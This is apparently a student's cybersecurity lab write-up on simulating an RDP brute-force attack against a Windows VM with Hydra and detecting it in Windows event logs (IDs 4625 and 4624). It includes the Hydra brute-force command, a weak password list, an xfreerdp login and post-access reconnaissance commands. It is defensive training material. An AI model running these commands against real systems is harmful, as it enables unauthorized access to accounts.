# Scenario 2: Lateral Movement via RDP Brute Force

## ✅Simulated Activity:
Simulated brute-force login attempts over Remote Desktop Protocol (RDP), and investigated for signs of lateral movement and reconnaissance.

---

## Attack Simulation

### Step 1: Enable RDP Access on Target
```powershell
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### Step 2: Brute-force Using Hydra (Kali)
```bash
echo -e "123456\nadmin\npassword\nAdmin123" > passlist.txt
hydra -t4 -V -f -l Administrator -P passlist.txt rdp://<Win10-IP>
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint02_lateral_movement_brute%20force_attack.png)

![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint02_lateral_movement_brute_force_logs.png)

![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint02_lateral_movement_brute_force_after_ac_lockout.png)

### Step 3: After finding the correct password access Remote Desktop
```bash
xfreerdp /u:<username> /p:<correct_password> /v:<Win10-IP>
```

### Post-Access Recon Simulation
Executed as simulation of attacker post-access:
```powershell
whoami /all
quser
net user
ipconfig /all
```

![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint02_lateral_movement_rdp_accessed.png)

> During brute-force simulation using Hydra, account lockout policy was triggered after multiple invalid attempts (41 total), as confirmed in Event Viewer logs (4625). Subsequent connection attempts failed, accurately reflecting Windows default security posture. This proves the realism of the simulation and how endpoint systems enforce threshold policies against brute-force lateral movement.

## Detection
- Windows Event Viewer
 - Event ID 4625: Failed login
  - and account lockout 
 - Event ID 4624: Successful login
 - Logon Type: 10 = RDP
 - Multiple failures logged from Kali IP = Brute force attack simulation

![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint02_lateral_movement_rdp_log.png)

### # Notes:
- Only one Windows VM used. Lateral movement was conceptual
- Hydra successfully simulated real-world credential brute-force via RDP
- Hit a realistic lockout threshold
- Observed 4625 logs
- Learned that real systems fight back when brute-forced

Interview Notes:  
Q: How do you detect RDP brute-force attacks?  
A: Monitor Event ID 4625 with LogonType = 10. Correlate repeated failures from a single source IP. Use Sysmon + SIEM for network and process telemetry.
